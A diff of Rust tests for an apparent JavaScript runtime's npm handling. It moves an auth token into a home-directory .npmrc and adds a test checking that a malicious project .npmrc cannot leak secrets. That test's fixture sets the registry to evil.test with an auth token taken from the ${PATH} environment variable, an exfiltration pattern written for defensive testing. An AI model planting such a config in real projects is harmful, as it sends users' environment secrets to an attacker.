@@ -589,6 +589,7 @@ if (!sawErr || direct.bad !== 1 || ok.value !== 42) throw new Error("unexpected 
         use sha2::Sha512;
         use std::io::Write as _;
         use std::sync::Mutex;
+        use vaeljs_lite_core::NpmOptions;
         use vaeljs_npm::Lockfile;
 
         fn write_tar_header(name: &str, size: usize) -> [u8; 512] {
@@ -678,9 +679,15 @@ if (!sawErr || direct.bad !== 1 || ok.value !== 42) throw new Error("unexpected 
         #[test]
         fn package_json_imports_transitive_npm_npmrc_auth_and_isolation_work() {
             let dir = TempDir::new().expect("project dir");
+            let home = TempDir::new().expect("home dir");
             let cache = TempDir::new().expect("cache dir");
             let marker = dir.path().join("LIFECYCLE_RAN");
 
+            write_file(
+                home.path(),
+                ".npmrc",
+                "//priv.example.test/npm/:_authToken=super-secret-token\n",
+            );
             write_file(
                 dir.path(),
                 "package.json",
@@ -701,7 +708,7 @@ if (!sawErr || direct.bad !== 1 || ok.value !== 42) throw new Error("unexpected 
             write_file(
                 dir.path(),
                 ".npmrc",
-                "@priv:registry=https://priv.example.test/npm/\n//priv.example.test/npm/:_authToken=super-secret-token\n",
+                "@priv:registry=https://priv.example.test/npm/\n",
             );
             write_file(
                 dir.path(),
@@ -781,7 +788,8 @@ if (
             let auth_ref = Arc::clone(&seen_auth);
 
             let opts = RuntimeOptions::new()
-                .with_remote(RemoteOptions::new().with_cache_dir(cache.path()));
+                .with_remote(RemoteOptions::new().with_cache_dir(cache.path()))
+                .with_npm(NpmOptions::new().with_npmrc_home_dir(home.path()));
             let mut rt = Runtime::with_options_and_auth_transport(
                 opts,
                 move |url, _timeout, _inm, _ims, auth| {
@@ -817,10 +825,13 @@ if (
             );
 
             // Offline replay with --frozen-lockfile and no transport succeeds.
-            let offline_opts = RuntimeOptions::new()
-                .with_offline(true)
-                .with_frozen_lockfile(true)
-                .with_npm_cache_dir(cache.path());
+            let offline_opts = RuntimeOptions::new().with_npm(
+                NpmOptions::new()
+                    .with_offline(true)
+                    .with_frozen_lockfile(true)
+                    .with_cache_dir(cache.path())
+                    .with_npmrc_home_dir(home.path()),
+            );
             Runtime::with_options(offline_opts)
                 .expect("offline runtime")
                 .run_file(&main)
@@ -1139,6 +1150,45 @@ if (dynJsr.jsrVal !== "jsr-root") {
             .expect("cached jsr runtime")
             .run_file(&jsr_dyn)
             .expect("cold dynamic import('my-jsr') succeeds from cache");
+        }
+
+        #[test]
+        fn malicious_repo_npmrc_cannot_exfiltrate_env_secret_in_quickjs() {
+            let dir = TempDir::new().expect("project dir");
+            let home = TempDir::new().expect("home dir");
+            let cache = TempDir::new().expect("cache dir");
+
+            write_file(
+                dir.path(),
+                ".npmrc",
+                "registry=https://evil.test/\n//evil.test/:_authToken=${PATH}\n",
+            );
+            let main = write_file(dir.path(), "main.js", r#"import "npm:evil-pkg@^1.0.0";"#);
+
+            let hits = Arc::new(Mutex::new(Vec::<String>::new()));
+            let hits_ref = Arc::clone(&hits);
+            let opts = RuntimeOptions::new()
+                .with_remote(RemoteOptions::new().with_cache_dir(cache.path()))
+                .with_npm(NpmOptions::new().with_npmrc_home_dir(home.path()));
+            let err = Runtime::with_options_and_auth_transport(
+                opts,
+                move |url, _timeout, _inm, _ims, _auth| {
+                    hits_ref.lock().expect("lock").push(url.to_owned());
+                    Ok(ok_response(b"nope".to_vec()))
+                },
+            )
+            .expect("runtime")
+            .run_file(&main)
+            .expect_err("malicious repo .npmrc auth/env directive must fail closed");
+            assert!(
+                hits.lock().expect("lock").is_empty(),
+                "evil.test must never be contacted: {:?}",
+                hits.lock().expect("lock")
+            );
+            assert!(
+                err.to_string().contains("project .npmrc"),
+                "unexpected error: {err}"
+            );
         }
     }
 }
